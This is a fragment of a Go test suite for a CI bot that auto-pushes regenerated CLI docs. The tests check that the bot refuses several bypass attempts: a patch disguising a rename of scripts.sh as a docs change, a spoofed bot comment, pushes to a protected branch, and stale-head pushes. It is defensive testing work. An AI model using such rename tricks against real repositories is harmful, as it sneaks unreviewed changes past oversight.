			t.Errorf("want a pushed-commit comment:\n%s", res.log)
		}
	})

	// The reviewer's bypass, which pushed "docs: auto-regenerate CLI
	// reference" renaming scripts.sh on main: refused up front now, and by
	// the staged check alone.
	rename := r.patch(func() { r.run("mv", "scripts.sh", "docs/cli-reference/x.md") })
	legacy := writeRawPatch(t, "diff --git a/scripts.sh b/docs/cli-reference/x.md\nrename old scripts.sh\nrename new docs/cli-reference/x.md\n")
	for name, script := range map[string]string{"validator": docsAutofixPushScript, "staged check alone": withoutValidator(t, docsAutofixPushScript)} {
		for pname, patch := range map[string]string{"rename": rename, "legacy rename": legacy} {
			t.Run(name+"/"+pname, func(t *testing.T) {
				res := r.runFlow(t, autofixFlow{script: script, patch: patch})
				if res.err == nil || res.head != r.head || !strings.Contains(res.out, "REFUSED") {
					t.Errorf("err=%v head moved=%v\n%s\n%s", res.err, res.head != r.head, res.out, res.log)
				}
			})
		}
	}

	t.Run("spoofed comment is not edited", func(t *testing.T) {
		spoof := `[{"id":5,"user":{"login":"mallory"},"body":"<!-- cli-docs-autofix -->"}]`
		res := r.runFlow(t, flow(autofixFlow{headRepo: "someone/beads", env: []string{"FAKE_COMMENTS=" + spoof}}))
		if res.err != nil || strings.Contains(res.log, "--method PATCH") || !strings.Contains(res.log, "--method POST") {
			t.Errorf("err=%v:\n%s", res.err, res.log)
		}
	})

	t.Run("protected head branch is never pushed", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{env: []string{`FAKE_RULES=[{"type": "update"}]`}}))
		if res.err != nil || res.head != r.head || !strings.Contains(res.log, "protected from bot pushes") {
			t.Errorf("err=%v head moved=%v\n%s", res.err, res.head != r.head, res.log)
		}
	})

	t.Run("push is leased to the run's head", func(t *testing.T) {
		res := r.runFlow(t, flow(autofixFlow{remoteAt: r.base}))
		if res.err != nil || res.head != r.base || !strings.Contains(res.log, "failed") {
			t.Errorf("err=%v head=%s\n%s\n%s", res.err, res.head, res.out, res.log)
		}
	})
}
